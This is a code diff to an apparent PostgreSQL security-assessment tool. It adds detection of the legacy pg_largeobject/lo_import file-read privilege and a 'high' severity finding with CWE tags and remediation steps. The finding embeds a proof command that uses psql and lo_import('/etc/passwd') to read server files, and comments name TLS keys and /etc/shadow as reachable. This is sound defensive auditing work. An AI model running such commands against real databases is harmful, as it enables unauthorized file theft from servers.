@@ -312,6 +312,26 @@ def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres",
             out["can_read_files"] = _t(p[1])
             out["can_write_files"] = _t(p[2])
         out["can_rce"] = bool(out.get("is_superuser") or out.get("can_copy_program"))
+
+        # Legacy large-object file read: pg_largeobject + lo_import()/lo_export()
+        # is the pre-10 file-I/O API and it is NOT gated by the pg_read_server_
+        # files role — the ACL is on the pg_largeobject table itself, and older
+        # deployments frequently left it PUBLIC. A non-superuser with SELECT on
+        # pg_largeobject reads arbitrary files the postgres OS user can read
+        # (recovery keys, TLS material, /etc/shadow if the DB runs as root — it
+        # should not, but has been observed).
+        try:
+            lo_priv = _simple_query(
+                sock, "SELECT has_table_privilege(current_user,'pg_largeobject','SELECT'), "
+                      "has_function_privilege(current_user,'lo_import(text)','EXECUTE'), "
+                      "has_function_privilege(current_user,'lo_export(oid,text)','EXECUTE')")
+            if lo_priv and lo_priv[0]:
+                lp = (lo_priv[0] + [None, None, None])[:3]
+                out["lo_select_pg_largeobject"] = _t(lp[0])
+                out["lo_import_exec"] = _t(lp[1])
+                out["lo_export_exec"] = _t(lp[2])
+        except Exception:                     # noqa: BLE001 — never break enum
+            pass
         # RCE-relevant procedural-language extensions already installed +
         # file-read/write primitives + adminpack (deprecated-but-still-shipped
         # admin RPCs) + file_fdw (SELECT arbitrary files as foreign tables,
@@ -565,6 +585,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 _rce_finding(out, tgt, h.ip, p.portid, lt, proof=pr.get("rce_proof"))
                 _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
                 _pivot_finding(out, tgt, h.ip, p.portid, lt)
+                _emit_lo_file_read(out, tgt, h.ip, p.portid, lt)
                 _public_schema_finding(out, tgt, h.ip, p.portid, lt)
                 _cve_finding(out, tgt, h.ip, p.portid, lt)
             elif pr.get("cred_access"):
@@ -616,6 +637,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                              proof=pr.get("rce_proof"))
                 _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
                 _pivot_finding(out, tgt, h.ip, p.portid, lt)
+                _emit_lo_file_read(out, tgt, h.ip, p.portid, lt)
                 _public_schema_finding(out, tgt, h.ip, p.portid, lt)
                 _cve_finding(out, tgt, h.ip, p.portid, lt)
     return out
@@ -761,6 +783,40 @@ def _pivot_finding(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
         "Remove dblink/postgres_fdw if unused; restrict outbound network from the DB "
         "host; least-privilege the role; rotate any foreign-server credentials.",
         ["CWE-441", "CWE-284"], kind="pg_pivot"))
+
+
+def _emit_lo_file_read(out: list, tgt: str, ip: str, port: int, lt: dict) -> None:
+    """Legacy large-object file read via pg_largeobject + lo_import()/lo_export().
+
+    Distinct from `can_read_files` (which needs the pg_read_server_files role):
+    the ACL lives on the pg_largeobject table itself, so a non-superuser with
+    SELECT on that table + EXECUTE on lo_import(text) reads arbitrary files the
+    postgres OS user can read. Old deployments frequently left this PUBLIC.
+    """
+    if not (lt.get("lo_select_pg_largeobject") and lt.get("lo_import_exec")):
+        return
+    can_write = lt.get("lo_export_exec")
+    role = lt.get("current_user", "current_user")
+    out.append(_finding(
+        "high",
+        "PostgreSQL legacy file read via pg_largeobject / lo_import()", tgt,
+        f"Role '{role}' has SELECT on pg_largeobject AND EXECUTE on "
+        f"lo_import(text)" + (" + lo_export(oid,text)" if can_write else "")
+        + ". That is the legacy PG file-I/O path — it does NOT require the "
+        "pg_read_server_files role and is often left PUBLIC on pre-10 clusters "
+        "that were upgraded rather than reinstalled. Anything the postgres OS "
+        "account can read is readable through it, including TLS keys and "
+        "recovery-window credentials."
+        + (" With lo_export the same role can also WRITE server-side files."
+           if can_write else ""),
+        f"psql 'host={ip} port={port} user={role}' -c "
+        "\"SELECT lo_import('/etc/passwd') AS oid; "
+        "SELECT convert_from(loread(lo_open((SELECT max(oid) FROM pg_largeobject_metadata), "
+        "262144), 8192), 'UTF8');\"",
+        "REVOKE SELECT ON pg_largeobject FROM PUBLIC; revoke EXECUTE on "
+        "lo_import/lo_export from non-privileged roles; upgrade to a PG "
+        "release that ships lo_compat_privileges=off by default.",
+        ["CWE-732", "CWE-284"], kind="pg_lo_file_read"))
 
 
 def _datamine_finding(out: list, tgt: str, ip: str, port: int, dm: dict | None) -> None:
